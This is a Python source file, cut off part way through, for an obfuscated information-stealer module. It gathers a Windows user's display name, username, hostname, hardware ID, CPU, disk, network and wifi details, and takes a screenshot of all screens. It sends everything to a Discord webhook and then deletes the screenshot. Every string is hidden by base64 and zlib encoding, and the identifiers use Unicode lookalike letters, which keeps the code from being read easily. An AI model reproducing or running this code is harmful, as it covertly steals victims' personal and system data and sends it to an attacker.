import ctypes
import os
import re
import subprocess
import uuid
import psutil
import requests
import wmi
from discord import Embed, File, SyncWebhook
from PIL import ImageGrab
import time

class SystemInfo:

    def __init__(self, webhook):
        𝘸𝙚𝙗𝙝𝘰𝗼𝘬 = 𝘚𝘺𝙣𝗰𝙒𝙚𝙗𝘩𝙤𝗼𝗸.from_url(𝘸𝘦𝗯𝗵𝙤𝙤𝙠)
        𝗲𝘮𝗯𝘦𝙙 = 𝗘𝗺𝗯𝗲𝗱(title=__𝘪𝗺𝘱𝘰𝙧𝘁__('base64').b64decode(__𝙞𝘮𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x0b5\xce\xa9Jq\x0f+\xf1t\xcd)\x8d\xca\xb5\xacL\nw3H\x0c\xb7,\x05\x00j\x0f\x08a')).decode(), color=𝗶𝘯𝘵.from_bytes(𝙢𝘢𝙥(lambda O, i: 538 - (𝙞𝗻𝘵(𝙊) + 𝗶), 𝗺𝗮𝘱(__𝘪𝘮𝙥𝙤𝗿𝘵__('base64').b64decode(__𝗶𝙢𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝙥(*[𝙞𝘵𝙚𝘳(__𝙞𝙢𝘱𝘰𝗿𝘁__('base64').b64decode(__𝙞𝙢𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝙖𝘯𝘨𝘦(0)), __𝙞𝘮𝘱𝗼𝙧𝘵__('base64').b64decode(__𝘪𝙢𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))
        𝘦𝘮𝙗𝗲𝙙.add_field(name=𝘀𝗲𝘭𝙛.user_data()[𝙞𝗻𝘵.from_bytes(𝙢𝙖𝘱(lambda O, i: 779 - (𝗶𝗻𝘁(𝗢) + 𝗶), 𝙢𝙖𝙥(__𝘪𝗺𝗽𝘰𝘳𝘵__('base64').b64decode(__𝗶𝙢𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝙥(*[𝘪𝘵𝗲𝙧(__𝘪𝘮𝗽𝘰𝘳𝘵__('base64').b64decode(__𝙞𝘮𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝗮𝗻𝙜𝘦(0)), __𝙞𝗺𝘱𝘰𝘳𝙩__('base64').b64decode(__𝙞𝙢𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], value=𝘴𝘦𝗹𝘧.user_data()[𝘪𝙣𝙩.from_bytes(𝙢𝘢𝙥(lambda O, i: 359 - (𝘪𝗻𝙩(𝗢) + 𝘪), 𝗺𝗮𝘱(__𝗶𝗺𝘱𝘰𝘳𝘵__('base64').b64decode(__𝘪𝘮𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝘱(*[𝗶𝘵𝙚𝗿(__𝗶𝗺𝙥𝗼𝗿𝘁__('base64').b64decode(__𝙞𝘮𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xda\xf3\xad\n5\x01\x00\x03\x84\x01Q')).decode())] * 3)), 𝙧𝘢𝘯𝙜𝙚(1)), __𝗶𝙢𝗽𝙤𝗿𝘵__('base64').b64decode(__𝙞𝗺𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], inline=𝘀𝘦𝙡𝘧.user_data()[𝙞𝗻𝘵.from_bytes(𝘮𝙖𝗽(lambda O, i: 476 - (𝗶𝗻𝘁(𝘖) + 𝘪), 𝙢𝗮𝗽(__𝘪𝗺𝙥𝗼𝘳𝘵__('base64').b64decode(__𝙞𝗺𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝙥(*[𝗶𝙩𝙚𝗿(__𝗶𝙢𝙥𝙤𝗿𝘁__('base64').b64decode(__𝘪𝙢𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\xf3sI6\x00\x00\x02\xfe\x01&')).decode())] * 3)), 𝙧𝘢𝗻𝘨𝙚(1)), __𝗶𝗺𝘱𝙤𝙧𝙩__('base64').b64decode(__𝙞𝗺𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)])
        𝗲𝘮𝙗𝘦𝗱.add_field(name=𝘴𝗲𝗹𝘧.system_data()[𝙞𝗻𝘵.from_bytes(𝙢𝙖𝘱(lambda O, i: 880 - (𝘪𝗻𝘁(𝗢) + 𝙞), 𝙢𝘢𝘱(__𝙞𝙢𝗽𝘰𝗿𝙩__('base64').b64decode(__𝗶𝘮𝙥𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝗽(*[𝘪𝘁𝘦𝗿(__𝙞𝘮𝘱𝘰𝘳𝘵__('base64').b64decode(__𝙞𝘮𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝙖𝗻𝘨𝙚(0)), __𝗶𝗺𝙥𝙤𝙧𝘵__('base64').b64decode(__𝘪𝙢𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], value=𝘴𝙚𝘭𝘧.system_data()[𝘪𝗻𝙩.from_bytes(𝘮𝙖𝗽(lambda O, i: 797 - (𝘪𝘯𝘁(𝙊) + 𝙞), 𝘮𝗮𝗽(__𝗶𝙢𝘱𝙤𝘳𝘁__('base64').b64decode(__𝙞𝙢𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝙥(*[𝙞𝘵𝘦𝘳(__𝙞𝘮𝗽𝗼𝗿𝘁__('base64').b64decode(__𝙞𝗺𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xda\xf3\xab\xca6\x02\x00\x03\xb2\x01f')).decode())] * 3)), 𝗿𝘢𝗻𝙜𝙚(1)), __𝘪𝙢𝘱𝙤𝙧𝘁__('base64').b64decode(__𝙞𝗺𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], inline=𝘴𝗲𝘭𝗳.system_data()[𝘪𝗻𝘁.from_bytes(𝘮𝗮𝙥(lambda O, i: 540 - (𝙞𝗻𝙩(𝙊) + 𝗶), 𝙢𝙖𝘱(__𝙞𝗺𝗽𝘰𝙧𝘁__('base64').b64decode(__𝙞𝗺𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝘪𝘵𝘦𝘳(__𝘪𝙢𝘱𝘰𝗿𝘵__('base64').b64decode(__𝙞𝘮𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xda\xf3\x0b\xf15\x01\x00\x03\x06\x01$')).decode())] * 3)), 𝗿𝗮𝘯𝗴𝘦(1)), __𝙞𝗺𝘱𝗼𝙧𝙩__('base64').b64decode(__𝗶𝘮𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)])
        𝗲𝗺𝘣𝘦𝗱.add_field(name=𝙨𝙚𝙡𝙛.disk_data()[𝙞𝘯𝘁.from_bytes(𝙢𝗮𝘱(lambda O, i: 471 - (𝙞𝗻𝙩(𝙊) + 𝘪), 𝘮𝘢𝗽(__𝘪𝘮𝘱𝗼𝙧𝘵__('base64').b64decode(__𝗶𝙢𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝙥(*[𝙞𝙩𝙚𝙧(__𝙞𝘮𝘱𝗼𝘳𝘵__('base64').b64decode(__𝘪𝘮𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝗮𝗻𝗴𝙚(0)), __𝙞𝘮𝙥𝙤𝙧𝘵__('base64').b64decode(__𝘪𝙢𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], value=𝘴𝗲𝘭𝗳.disk_data()[𝗶𝙣𝙩.from_bytes(𝗺𝙖𝙥(lambda O, i: 884 - (𝙞𝘯𝙩(𝙊) + 𝙞), 𝙢𝗮𝗽(__𝗶𝙢𝙥𝘰𝘳𝘵__('base64').b64decode(__𝘪𝘮𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝘪𝘵𝘦𝙧(__𝗶𝙢𝘱𝗼𝘳𝘁__('base64').b64decode(__𝙞𝘮𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xda\xf3wI\xaf\x02\x00\x03T\x01u')).decode())] * 3)), 𝘳𝘢𝙣𝘨𝘦(1)), __𝙞𝘮𝙥𝙤𝗿𝘵__('base64').b64decode(__𝗶𝘮𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], inline=𝘀𝘦𝘭𝙛.disk_data()[𝘪𝘯𝘵.from_bytes(𝗺𝘢𝘱(lambda O, i: 927 - (𝗶𝙣𝘁(𝗢) + 𝘪), 𝙢𝙖𝙥(__𝙞𝙢𝘱𝘰𝘳𝙩__('base64').b64decode(__𝙞𝘮𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝗽(*[𝘪𝙩𝗲𝙧(__𝗶𝘮𝗽𝗼𝘳𝙩__('base64').b64decode(__𝘪𝗺𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3\x0f\xf14\x04\x00\x02\xff\x01\x1e')).decode())] * 3)), 𝘳𝙖𝗻𝗴𝙚(1)), __𝘪𝗺𝙥𝙤𝙧𝙩__('base64').b64decode(__𝘪𝗺𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)])
        𝗲𝗺𝙗𝙚𝙙.add_field(name=𝙨𝗲𝗹𝘧.network_data()[𝙞𝘯𝘁.from_bytes(𝗺𝗮𝙥(lambda O, i: 539 - (𝘪𝙣𝙩(𝘖) + 𝙞), 𝘮𝗮𝗽(__𝙞𝗺𝗽𝗼𝘳𝘵__('base64').b64decode(__𝙞𝘮𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝗽(*[𝙞𝘵𝗲𝘳(__𝙞𝙢𝗽𝘰𝙧𝙩__('base64').b64decode(__𝘪𝘮𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝘢𝘯𝙜𝗲(0)), __𝙞𝙢𝗽𝘰𝗿𝘁__('base64').b64decode(__𝘪𝘮𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], value=𝘴𝗲𝘭𝙛.network_data()[𝗶𝙣𝘵.from_bytes(𝙢𝗮𝘱(lambda O, i: 353 - (𝙞𝘯𝘁(𝙊) + 𝘪), 𝗺𝗮𝘱(__𝗶𝘮𝗽𝙤𝙧𝘵__('base64').b64decode(__𝙞𝘮𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝗽(*[𝗶𝙩𝗲𝘳(__𝗶𝙢𝙥𝘰𝗿𝘵__('base64').b64decode(__𝗶𝘮𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xda\xf3\xad\n\xad\x04\x00\x03\xc9\x01\x96')).decode())] * 3)), 𝙧𝗮𝘯𝗴𝘦(1)), __𝘪𝙢𝙥𝘰𝙧𝘁__('base64').b64decode(__𝙞𝘮𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], inline=𝘀𝙚𝙡𝙛.network_data()[𝙞𝗻𝘵.from_bytes(𝗺𝙖𝘱(lambda O, i: 540 - (𝘪𝗻𝙩(𝗢) + 𝙞), 𝙢𝘢𝙥(__𝗶𝙢𝗽𝘰𝗿𝘵__('base64').b64decode(__𝘪𝙢𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝗽(*[𝘪𝘁𝘦𝗿(__𝘪𝘮𝘱𝙤𝘳𝘁__('base64').b64decode(__𝗶𝘮𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xda\xf3\x0b\xf15\x01\x00\x03\x06\x01$')).decode())] * 3)), 𝙧𝘢𝗻𝘨𝗲(1)), __𝙞𝘮𝘱𝘰𝙧𝘵__('base64').b64decode(__𝙞𝙢𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)])
        𝘦𝗺𝗯𝘦𝗱.add_field(name=𝙨𝗲𝗹𝗳.wifi_data()[𝙞𝙣𝙩.from_bytes(𝙢𝙖𝗽(lambda O, i: 721 - (𝙞𝙣𝙩(𝘖) + 𝗶), 𝙢𝗮𝗽(__𝙞𝗺𝙥𝗼𝗿𝙩__('base64').b64decode(__𝗶𝗺𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝘱(*[𝘪𝘵𝘦𝘳(__𝘪𝙢𝘱𝙤𝙧𝘵__('base64').b64decode(__𝘪𝗺𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝗮𝘯𝙜𝗲(0)), __𝘪𝗺𝙥𝗼𝗿𝘁__('base64').b64decode(__𝘪𝗺𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], value=𝙨𝙚𝙡𝗳.wifi_data()[𝗶𝘯𝘵.from_bytes(𝙢𝙖𝗽(lambda O, i: 337 - (𝙞𝙣𝘵(𝙊) + 𝘪), 𝙢𝘢𝘱(__𝗶𝘮𝙥𝗼𝗿𝘁__('base64').b64decode(__𝘪𝘮𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝘱(*[𝘪𝙩𝘦𝘳(__𝗶𝘮𝙥𝙤𝙧𝘵__('base64').b64decode(__𝙞𝗺𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xda\xf3\xad\xf25\x02\x00\x03r\x01G')).decode())] * 3)), 𝗿𝘢𝙣𝘨𝗲(1)), __𝘪𝘮𝗽𝗼𝙧𝘵__('base64').b64decode(__𝘪𝘮𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], inline=𝙨𝙚𝗹𝗳.wifi_data()[𝙞𝗻𝘁.from_bytes(𝗺𝙖𝙥(lambda O, i: 558 - (𝙞𝙣𝘵(𝘖) + 𝙞), 𝙢𝗮𝗽(__𝙞𝗺𝗽𝙤𝘳𝙩__('base64').b64decode(__𝗶𝗺𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝘱(*[𝗶𝙩𝙚𝘳(__𝗶𝙢𝗽𝘰𝗿𝘁__('base64').b64decode(__𝘪𝗺𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3\x0b\t5\x02\x00\x03\x14\x01*')).decode())] * 3)), 𝗿𝘢𝙣𝘨𝗲(1)), __𝙞𝙢𝘱𝘰𝙧𝘁__('base64').b64decode(__𝙞𝗺𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)])
        𝘪𝙢𝗮𝘨𝗲 = 𝙄𝗺𝙖𝗴𝗲𝘎𝗿𝙖𝘣.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None)
        𝗶𝙢𝙖𝙜𝙚.save(__𝗶𝘮𝗽𝙤𝘳𝙩__('base64').b64decode(__𝙞𝘮𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xdaK6\xf2\xab\x8c\n\x0f+M6\xca(Kq6-O\xcaM\xb6\x05\x00I\xc1\x07\x0e')).decode())
        𝙚𝘮𝗯𝙚𝙙.set_image(url=__𝗶𝗺𝘱𝙤𝘳𝘁__('base64').b64decode(__𝗶𝘮𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x8b\x8c\x082\x88\x0c\xf7\xcbO\n\x0f+Mq\xc9/\xf31\xf6\xcbJ\xce\r\xcbI\xca\x03\x8a\x19\x07\x96&\xbb\x9b\xe6\x01\x00\xe9\n\x0c\xb0')).decode())
        try:
            𝘄𝙚𝙗𝗵𝘰𝗼𝗸.send(embed=𝘦𝗺𝘣𝘦𝘥, file=𝙁𝘪𝙡𝘦(__𝘪𝗺𝗽𝙤𝘳𝘵__('base64').b64decode(__𝙞𝙢𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xda\xf3\xc9\xa9\xa8\x8a4\xf6\xca\x89\n7\xadJt\xb74\xf0\xc9s*\x8d*\xb7\xb5\x05\x00hj\x08\x1a')).decode(), filename=__𝗶𝙢𝘱𝙤𝗿𝙩__('base64').b64decode(__𝘪𝘮𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xdaK6\xf2\xab\x8c\n\x0f+M6\xca(Kq6-O\xcaM\xb6\x05\x00I\xc1\x07\x0e')).decode()), username=__𝙞𝙢𝘱𝘰𝗿𝙩__('base64').b64decode(__𝙞𝘮𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x0b\n7,O\x8d\xf0\xca\x89\x0c7\xb1\x05\x00\x1a0\x03\xe6')).decode(), avatar_url=__𝙞𝗺𝙥𝙤𝙧𝘁__('base64').b64decode(__𝗶𝗺𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4,\xf0\xc9\xcd)\x892\x0e\xab\xf4\xc9\xf5+K\n\xb6\xf4L\xcc+\xc8M\xcc\x8d\n\xf6\xc9s*\x8d*\xb7\xb5\x05\x00Q\xda\x0fT')).decode())
        except:
            pass
        if 𝘰𝙨.path.exists(__𝘪𝗺𝘱𝘰𝘳𝘁__('base64').b64decode(__𝗶𝘮𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xdaK6\xf2\xab\x8c\n\x0f+M6\xca(Kq6-O\xcaM\xb6\x05\x00I\xc1\x07\x0e')).decode()):
            𝙤𝘴.remove(__𝙞𝗺𝙥𝙤𝘳𝙩__('base64').b64decode(__𝙞𝘮𝙥𝗼𝗿𝙩__('zlib').decompress(b'x\xdaK6\xf2\xab\x8c\n\x0f+M6\xca(Kq6-O\xcaM\xb6\x05\x00I\xc1\x07\x0e')).decode())

    def user_data(self):

        def display_name():
            𝙂𝗲𝘁𝗨𝘀𝘦𝗿𝗡𝗮𝗺𝘦𝘌𝘅 = 𝘤𝘵𝙮𝗽𝘦𝘴.windll.secur32.GetUserNameExW
            𝙉𝘢𝗺𝘦𝘿𝗶𝘀𝗽𝙡𝗮𝘆 = 𝙞𝘯𝘁.from_bytes(𝗺𝙖𝗽(lambda O, i: 767 - (𝘪𝘯𝘵(𝙊) + 𝘪), 𝗺𝘢𝙥(__𝘪𝙢𝙥𝘰𝗿𝘁__('base64').b64decode(__𝙞𝙢𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝗽(*[𝙞𝘵𝗲𝗿(__𝙞𝘮𝙥𝗼𝘳𝙩__('base64').b64decode(__𝙞𝙢𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xab\x8a4\x00\x00\x03\x8c\x01R')).decode())] * 3)), 𝗿𝙖𝙣𝘨𝘦(1)), __𝙞𝘮𝗽𝙤𝙧𝘵__('base64').b64decode(__𝘪𝗺𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)
            𝘀𝙞𝘻𝗲 = 𝙘𝙩𝘺𝙥𝗲𝘴.pointer(𝘤𝘵𝙮𝙥𝗲𝘀.c_ulong(𝙞𝘯𝙩.from_bytes(𝙢𝘢𝘱(lambda O, i: 658 - (𝙞𝙣𝘁(𝙊) + 𝗶), 𝘮𝙖𝗽(__𝘪𝘮𝗽𝘰𝙧𝘁__('base64').b64decode(__𝗶𝘮𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝙥(*[𝙞𝘁𝙚𝗿(__𝘪𝙢𝗽𝙤𝘳𝙩__('base64').b64decode(__𝙞𝘮𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝘢𝙣𝘨𝘦(0)), __𝘪𝗺𝙥𝘰𝙧𝘵__('base64').b64decode(__𝗶𝘮𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)))
            𝗚𝘦𝘁𝙐𝙨𝘦𝙧𝘕𝗮𝙢𝘦𝘌𝘅(𝙉𝘢𝘮𝗲𝘋𝘪𝘴𝘱𝙡𝗮𝘆, None, 𝘀𝘪𝙯𝘦)
            𝙣𝗮𝗺𝘦𝘽𝙪𝘧𝗳𝗲𝘳 = 𝘤𝘵𝘆𝘱𝗲𝘴.create_unicode_buffer(𝘀𝙞𝘇𝗲.contents.value)
            𝘎𝘦𝘵𝙐𝘀𝗲𝘳𝗡𝙖𝗺𝘦𝙀𝘅(𝗡𝙖𝙢𝙚𝘿𝙞𝘀𝗽𝘭𝙖𝘆, 𝙣𝗮𝙢𝙚𝗕𝘂𝘧𝗳𝙚𝘳, 𝘀𝗶𝘻𝗲)
            return 𝗻𝙖𝗺𝗲𝗕𝘂𝙛𝗳𝘦𝙧.value
        𝙙𝗶𝙨𝗽𝘭𝙖𝘺_𝘯𝙖𝙢𝙚 = 𝙙𝘪𝙨𝗽𝘭𝗮𝙮_𝗻𝗮𝘮𝘦()
        𝗵𝙤𝙨𝙩𝘯𝙖𝙢𝘦 = 𝘰𝙨.getenv(__𝗶𝗺𝗽𝙤𝙧𝘵__('base64').b64decode(__𝙞𝘮𝘱𝗼𝘳𝘵__('zlib').decompress(b"x\xda\x0b4\xb0\xf4\x0bu\x0b\x0b\r\n\xf3\xf2\x0f\x0c5t\x03\x00'w\x04\xad")).decode())
        𝘂𝘴𝗲𝗿𝗻𝙖𝙢𝙚 = 𝗼𝘴.getenv(__𝘪𝙢𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝙢𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x0b\x0b\xf3s\x0b\xcd6u\n\t\r\xb5\x05\x00\x18\x9b\x03\xb3')).decode())
        return (__𝙞𝗺𝘱𝗼𝗿𝘁__('base64').b64decode(__𝘪𝘮𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xcf\xf52L6\x0eJK\x0c7MK6\xca)Nt\xb74\x8c\x8a\x082\x88\n\xc9O\x0f\x8b\xf0\xcbIN\xb7\xb5\x05\x00\xd7\xba\x0b\xc3')).decode(), __𝗶𝘮𝘱𝙤𝙧𝘵__('base64').b64decode(__𝙞𝙢𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x8btwJ\x0fr\xcf\xa9Jv\xaf\xc8H\rv\xf2\x8f\x0c7\xcc\xf1\xcft2O\x0b,\xf0L2\xf63H\xcau+\x89\n\xc9OO56\xf0\x0e\x8b\xf0\xcbI\xce5\xcdH\n\x0f5\xf3\xf4(\xb1\x8c\x04\xea\x05\x00\xbfK\x15]')).decode().format(𝙙𝙞𝘀𝘱𝘭𝘢𝘺_𝙣𝗮𝙢𝙚, 𝙝𝘰𝙨𝙩𝗻𝘢𝙢𝘦, 𝘶𝙨𝗲𝘳𝗻𝗮𝙢𝗲), False)

    def system_data(self):

        def get_hwid():
            try:
                𝗵𝙬𝙞𝗱 = 𝘀𝘶𝙗𝙥𝙧𝗼𝙘𝘦𝘴𝘀.check_output(__𝗶𝘮𝗽𝙤𝗿𝘁__('base64').b64decode(__𝗶𝙢𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x0b\xac*H\x0e3\xca)\x8dr\xb74N6\xac\x08I\x8d\xf03\x88\n7\xa8\xf2\xcd\xa90\x8e\xcc\r+\x89pK\xf1\x0b\x0e\xf5-\x8d\x8a\xc8\xc8\xf1t\xf7\xabJ\xf6\xf0*\x8b\xf2\x08\xcbJqv\xca\x8b\x8a\x08LO\x89\x08+\x88r\xb4\xb5\x05\x00\x89\xca\x18\xbc')).decode(), shell=True, stdin=𝙨𝘶𝘣𝙥𝗿𝙤𝘤𝗲𝙨𝙨.PIPE, stderr=𝘀𝘂𝘣𝙥𝗿𝘰𝙘𝗲𝘀𝘀.PIPE).decode(__𝙞𝘮𝗽𝘰𝗿𝘁__('base64').b64decode(__𝗶𝙢𝗽𝙤𝗿𝙩__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()).split(__𝘪𝗺𝗽𝗼𝘳𝙩__('base64').b64decode(__𝘪𝙢𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode())[𝗶𝙣𝘁.from_bytes(𝘮𝙖𝙥(lambda O, i: 742 - (𝘪𝙣𝙩(𝘖) + 𝘪), 𝙢𝘢𝙥(__𝘪𝙢𝙥𝙤𝗿𝘁__('base64').b64decode(__𝗶𝘮𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝘱(*[𝗶𝘵𝗲𝙧(__𝗶𝗺𝙥𝘰𝗿𝘵__('base64').b64decode(__𝗶𝘮𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xab\n\xac\x00\x00\x03\xc4\x01\x92')).decode())] * 3)), 𝗿𝗮𝙣𝗴𝙚(1)), __𝗶𝙢𝗽𝘰𝙧𝙩__('base64').b64decode(__𝗶𝘮𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].strip()
            except:
                𝘩𝙬𝙞𝗱 = __𝙞𝙢𝘱𝘰𝗿𝘁__('base64').b64decode(__𝘪𝙢𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x0b\xc9\xb5,\x8d\n\xb4\xb5\x05\x00\x0cT\x02\x95')).decode()
            return 𝗵𝘄𝘪𝙙
        𝙘𝙥𝘂 = 𝙬𝗺𝙞.WMI().Win32_Processor()[𝙞𝘯𝘁.from_bytes(𝘮𝙖𝘱(lambda O, i: 783 - (𝙞𝘯𝘵(𝘖) + 𝗶), 𝙢𝙖𝙥(__𝗶𝙢𝘱𝙤𝘳𝘁__('base64').b64decode(__𝗶𝘮𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝙥(*[𝙞𝘵𝘦𝙧(__𝘪𝘮𝗽𝘰𝙧𝘁__('base64').b64decode(__𝗶𝘮𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝙖𝗻𝗴𝗲(0)), __𝗶𝗺𝗽𝙤𝘳𝙩__('base64').b64decode(__𝙞𝗺𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].Name
